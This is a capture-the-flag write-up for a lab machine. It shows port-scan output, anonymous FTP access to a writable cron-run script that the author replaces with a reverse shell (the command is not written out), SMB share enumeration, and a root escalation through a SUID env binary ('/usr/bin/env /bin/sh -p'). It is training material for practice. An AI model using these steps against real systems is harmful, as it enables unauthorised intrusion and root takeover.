# Info

## IP = ?

## Creds

# Ports

## PortScanning

```
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

## 21

### Scanning

```
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:$IP
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
```
### Anonymous Login

- get 3 files, most important: _clean.sh_

```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi

```

### I have permission to write this file, and because the _removed_files.log_ is increasing, I think that the _clean.sh_ file is running like a cron job. Uploading a rev shell in bash, I got a shell

## 22

### Scanning
```
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8bca21621c2b23fa6bc61fa813fe1c68 (RSA)
|   256 9589a412e2e6ab905d4519ff415f74ce (ECDSA)
|_  256 e12a96a4ea8f688fcc74b8f0287270cd (ED25519)
```

## 139

### Scanning
```
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

## 445

### Scanning
```
Host script results:
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-02-01T12:37:37
|_  start_date: N/A
|_clock-skew: mean: 3s, deviation: 1s, median: 2s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2024-02-01T12:37:37+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

### `smbclient`

```
┌──(kali㉿kali)-[~/Desktop/CTFs/tryhackme/Anonymous]
└─$ smbclient -L $IP
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            ANONYMOUS
                                                                             
┌──(kali㉿kali)-[~/Desktop/CTFs/tryhackme/Anonymous]
└─$ smbclient \\\\$IP\\pics       
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \>
```

# PrivEsc

## `cat user.txt`

- flag{XXXX}

## SUID bin

```
/usr/bin/env
```

## Got root

- https://gtfobins.github.io/gtfobins/env/#suid
```
namelessone@anonymous:~$ /usr/bin/env /bin/sh -p
# whoami
root
# cd /root
# cat root.txt
flag{XXXX}
```

